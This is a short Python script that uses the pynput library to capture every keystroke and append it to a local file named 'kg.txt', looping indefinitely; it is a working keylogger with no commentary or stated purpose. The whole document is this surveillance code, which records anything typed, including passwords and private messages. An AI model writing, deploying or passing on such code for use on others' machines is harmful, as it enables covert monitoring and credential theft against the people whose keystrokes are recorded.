from pynput.keyboard import Listener, Key
file = open("kg.txt", "a")
def on_press(key):
  try:
    file.write(f'\n{key}')
    file.flush()
  except:
    pass


while True:
  listener = Listener(on_press=on_press)
  listener.start()
  listener.join()